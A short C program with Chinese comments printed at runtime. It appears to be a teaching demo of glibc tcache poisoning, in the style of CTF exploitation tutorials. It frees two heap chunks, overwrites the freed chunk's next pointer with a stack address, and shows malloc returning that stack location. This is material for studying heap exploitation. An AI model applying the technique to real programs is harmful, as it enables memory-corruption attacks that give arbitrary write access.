#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    size_t stack_var;
    printf("定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n", (char *)&stack_var);

    printf("接下来申请两个 chunk\n");
    intptr_t *a = malloc(128);
    printf("chunk a 在: %p\n", a);
    intptr_t *b = malloc(128);
    printf("chunk b 在: %p\n", b);

    printf("free 掉这两个 chunk\n");
    free(a);
    free(b);

    printf("现在 tcache 那个链表是这样的 [ %p -> %p ].\n", b, a);
    printf("我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p", b, sizeof(intptr_t), &stack_var);
    b[0] = (intptr_t)&stack_var;
    printf("现在 tcache 链表是这样的 [ %p -> %p ].\n", b, &stack_var);

    printf("然后一次 malloc : %p\n", malloc(128));
    printf("现在 tcache 链表是这样的 [ %p ].\n", &stack_var);

    intptr_t *c = malloc(128);
    printf("第二次 malloc: %p\n", c);
    printf("ojbk\n");

    return 0;
}